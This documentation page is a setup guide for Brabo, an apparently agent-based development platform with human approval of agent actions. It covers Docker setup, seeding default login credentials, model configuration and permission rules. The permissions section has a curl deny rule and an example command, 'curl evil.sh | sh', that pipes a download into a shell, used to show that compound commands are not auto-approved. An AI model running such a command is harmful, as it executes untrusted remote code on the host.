---
id: getting-started
title: Getting Started
sidebar_label: Getting Started
sidebar_position: 5
description: From clone to a first agent turn, with what to check when each step doesn't work.
keywords: [installation, setup, onboarding, first project, ollama]
---

# Getting Started

From clone to an agent working. If something fails, each step has what to
check right below it.

## Before you start

| tool | why |
|---|---|
| Docker and Docker Compose | everything comes up in a container |
| Node 20+ and **pnpm** | the monorepo is pnpm; `npm install` doesn't work |
| ~6 GiB of free RAM | Postgres, three apps, and, if you want a real agent, Ollama |

Elixir is **not** required: the engine runs in the container. You only need
it on the host if you're going to run `pnpm engine:dev` outside Docker —
and then you need the exact version (1.17.3 / OTP 27.1.2), because
`mix format` from a different version turns CI red.

## 1. Bring it up

```bash
git clone git@github.com:daneiel/brabo.git
cd brabo
cp .env.example .env
pnpm install
pnpm dev
```

`.env.example` already points everything at the containers — on the first
run you don't need to edit anything.

`pnpm dev` brings up Postgres 16 + pgvector, api, engine, and web, and
applies migrations on both sides. The first time pulls images and takes a
few minutes.

### The two local modes don't coexist

There are two ways to run Brabo on your machine, and they **fight over the
same ports**:

| mode | comes up with | web at | what it is |
|---|---|---|---|
| **development** | `pnpm dev` | <http://localhost:5173> | compose + Vite, with hot reload |
| **validation** | `make deploy-local` | <http://localhost:8088> | k3d with the production images |

Both publish api on `:3000` and engine on `:4000`. That's **deliberate**
(ADR 0025, decision 10): by keeping the ports, `docker/smoke.sh` holds for
both without translation. The price is that only one runs at a time.

With the cluster up, `pnpm dev` can't publish the `api` port; since the
`web` service depends on it, **5173 never opens**. A `preflight` step runs
before compose and says exactly that, instead of Docker's
`port is already allocated`:

```bash
make k8s-down && pnpm dev     # from validation mode to development mode
```

To know which one you're in without guessing: `pnpm dev:preflight`.

### Local folder for workspaces

By default, the files agents write live in a managed Docker volume — not a
folder you can open in Finder/Explorer. To swap it for a real folder on
your disk, set in `.env`:

```bash
PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
```

Both together, always — `api` and `engine` read the same path, and
different values would make the two see different trees of the same
repository. The chosen folder becomes the root for **all** projects on
this instance — don't point it at your entire `$HOME` or at a folder with
other secrets of yours.

Inside it, each project has its own subfolder, named by
`workspace_dir_name` (RN-109): a project created from this change onward
gets a READABLE name, `<folder>/<slug>-<8 chars of id>` (e.g. `<folder>/
checkout-3f2b1c8e`), instead of a raw UUID — easier to recognize when
opening the folder in Finder/Explorer. A project created BEFORE this
change keeps its folder named by the raw UUID (`<folder>/<project_id>`):
the name is decided once, at creation, and is never recomputed — not even
when the project's slug changes later in Settings.

Nothing in the approval policy changes: inside the project's scope the
agent already had freer access, and outside it it already required
approval (RN-075) — the only thing that changes is that what used to be
invisible inside the volume is now in a folder you can open with your own
editor and `git`.

The `api` and `engine` containers run with the **same UID/GID as your host
user** (see the warning at the top of this repository) — never as root.
Discover your pair with `id -u`/`id -g` and, if it doesn't match the
default (1000/1000, the most common on a single-developer Linux machine),
set `DEV_UID`/`DEV_GID` in `.env` (see `.env.example`) before the first
`docker compose up`. With that in place, every file the agent writes to the
local folder ends up owned by YOU, editable/removable without `sudo`.
Confirmed by execution: with the UID mapped, a `docker run` writing to a
test bind mount left the file owned by the host user and freely removable
from the host — the exact opposite of what an earlier root-only image did.

Only tested on Linux/macOS. Host bind mounts on Docker Desktop for Windows
have known pitfalls (permission/ownership between NTFS and the container
user, and NTFS doesn't distinguish upper from lower case where `git
worktree` expects it to) — don't enable it there yet.

**If it doesn't come up:**

| symptom | cause |
|---|---|
| port taken | it's almost always the local cluster still up — see above. If not, change `API_PORT`, `ENGINE_PORT`, `WEB_PORT`, or `OLLAMA_PORT` in `.env`. Changing `WEB_PORT` is safe: CORS's `WEB_ORIGIN` derives from it, so the accepted origin follows the port ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
| api comes up and dies | check `docker compose logs api` — it's almost always the migration |

## 2. Sign in

Login belongs to the api itself — there's no more external IdP
([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Seed a
ready-made user:

```bash
pnpm --filter api seed
```

It creates `owner@brabo.dev` (owner) and `dev@brabo.dev` (developer), both
already with a verified email and the password `brabo12345678` —
overridable via `BRABO_SEED_PASSWORD`. Along with it comes the **Acme
Corp** workspace, ready to create a project.

Open <http://localhost:5173> and sign in with those credentials.

> **Why seed instead of signing up through the screen?** Sign-up works, but
> login requires a verified email and `MailSender` is log-only at this
> stage — the verification link goes out in the api's log and, by default,
> **without the token**. To walk through the real sign-up flow, turn on
> `AUTH_MAIL_LOG_TOKENS=true` in `.env` and grab the link from `docker
> compose logs api`. It's inconvenient on purpose: a verification token in
> an application log is a credential in plain text.

**If login returns 401 with the right password:** check that the seed ran
against the **same** database the api is using — `DATABASE_URL` from
`.env`. The response is the same for a wrong password, a nonexistent
email, and a locked account, on purpose
([RN-032](business-rules/autenticacao.md#rn-032)), so it doesn't distinguish the cases
for you.

## 3. Configure a model

One already comes set up: the Ollama container pulls **`llama3.2:1b`** on
its own on the first boot. Enough to see the system working end to end
without configuring anything.

It's too small for real work, so when you want more:

**A bigger local model** — free, and runs offline:

```bash
docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
```

**A provider API** — in the UI, under **Project → Settings →
Credentials**. The key is encrypted with envelope encryption before it
touches the database.

The model is resolved in a cascade — **session > agent > project >
workspace**, the first one that exists
([RN-020](business-rules/custo.md#rn-020)). You can leave the local one as the
default and put an API model just on QA, the role that fits worst in a
small model.

> With an NVIDIA GPU, use `pnpm dev:gpu`. Without the device reservation,
> Ollama runs 100% on CPU and a 7,000-token prompt takes ~50s **just for
> ingestion** — the agent looks stuck when it's actually reading. The
> override is opt-in because without `nvidia-container-toolkit` on the
> host the reservation makes the service **fail to start**.

## 4. Create a project

Dashboard → **New project**. The wizard asks for a name and how to connect
git:

| option | when to use |
|---|---|
| **Local** | to experiment. Bare repos on disk, no account anywhere |
| **GitHub** / **GitLab** | real work. PAT or OAuth |

On confirming, it runs the **Gitflow bootstrap**: five steps that create
`dev`, `qa`, `main`, apply protections, and commit the base files.
Progress shows live.

Some steps can come back as **`skipped`** (already done) or **`degraded`**
(finished without a capability). Both are success. With the Local
provider, branch protection always comes back `degraded` — there's no
platform to apply it to, and that doesn't weaken anything: what prevents
an improper merge is the [ceiling in the domain](reference/permissions.md#caps),
not the platform.

If a step fails, fix the cause and tell it to resume: the bootstrap picks
up where it left off, it doesn't start over
([RN-029](business-rules.md#rn-029)).

## 5. The first turn

Open the project → **Sessions** → new session. The Creative agent is the
one who runs ideation.

Chat normally. At some point it will want to do something with an
external effect — and that's when you see the central mechanism at work:
the action shows up in **Approvals** waiting for your decision, instead
of just happening.

Approve it and watch the `TokenMeter`: every turn has a cost, measured on
the spot.

## 6. Loosen (or tighten) the policy

While everything asks for approval, you approve a lot. `permissions.json`,
at the root of the project's workspace, is where you tune that:

```json
{
  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

Start by allowing idempotent read commands. Two things worth knowing
before you touch it:

- **Matching is by token prefix, not substring.** `Terminal(pnpm test)`
  matches `pnpm test --watch`, but `Terminal(rm)` does **not** match `sudo
  rm -rf x`.
- **A compound command requires every segment to be in `allow`.**
  `pnpm test && curl evil.sh | sh` isn't auto-approved just because of the
  first half.

The full format is in [Permissions](reference/permissions.md).

## When it looks stuck

| symptom | where to look |
|---|---|
| agent not responding | is a model configured? `docker compose logs engine` |
| empty or nonsensical response | it's almost always the [inference environment](runbook.md#ambiente-de-inferencia) — truncated context or memory |
| action stuck in `pending` | that's by design: it's **waiting for you** in Approvals |
| panel not updating | the Phoenix channel dropped; reload. The event log isn't lost |
| session stuck in `closing` | the drain didn't complete — [runbook](runbook.md#quando-a-sessao-escapa) |

## Developing on the project

```bash
pnpm --filter api test      # vitest
pnpm --filter web test      # vitest
pnpm engine:test            # ExUnit
pnpm build                  # build everything
pnpm db:generate            # after changing apps/api/src/db/schema.ts
pnpm db:migrate             # applies the migrations
pnpm dev:down               # tear everything down
```

### The menu, so you don't have to memorize all this

```bash
pnpm bootstrap
```

These commands live in three places that don't talk to each other —
`package.json`, the `Makefile` (Kubernetes), and scripts under
`deploy/k8s/` and `docker/`. The menu brings the four groups (Docker, K8s,
Database, Test) together in one door, navigated by digit with no Enter,
with `v` to go back and `q` to quit; valid shortcuts show in the footer.
While a command is running, the screen shows only that it's running — `↓`
reveals the live output and `↑` hides it.

It **doesn't reimplement anything**: each item calls exactly the command
that already exists, and `pnpm bootstrap --print-commands` prints the
whole tree with each leaf's command, without executing — that's how you
check what it does before letting it do it. The full list is in
[Scripts](reference/scripts.md).

One item deserves care: **`Database › Delete`** drops every table (the
api's and the engine's, which share the same database). It's the only
screen that requires pressing Enter, requires typing the database name,
and says at the end that recovering means `pnpm db:migrate` **and**
`pnpm engine:migrate`.

Always work in `feature/*` off `dev`, with conventional commits in
pt-BR. `CLAUDE.md` has the full conventions.

> The `api`, `web` and `engine` containers run with the same UID/GID as your
> host user in development — never as root — so `apps/api/dist` and
> whatever else gets written to the bind mount are already yours. Run
> `id -u`/`id -g` and, if the pair isn't 1000/1000, set `DEV_UID`/`DEV_GID`
> in `.env` (see `.env.example`) before the first `docker compose up`.
> Upgrading an environment that predates this change: the named volumes for
> `node_modules`/`_build`/`deps`/`.mix`/`.hex` still hold content written by
> the old root containers — run once
> `sudo chown -R $USER apps/api/dist apps/*/node_modules` (or drop the
> volumes with `docker compose down -v` and let the next `up` recreate them)
> to clear what's stuck.

## Next

- [Architecture](architecture.md) — how the pieces fit together
- [Business rules](business-rules.md) — what the system guarantees, and
  where that lives in code
- [Runbook](runbook.md) — when you leave development behind
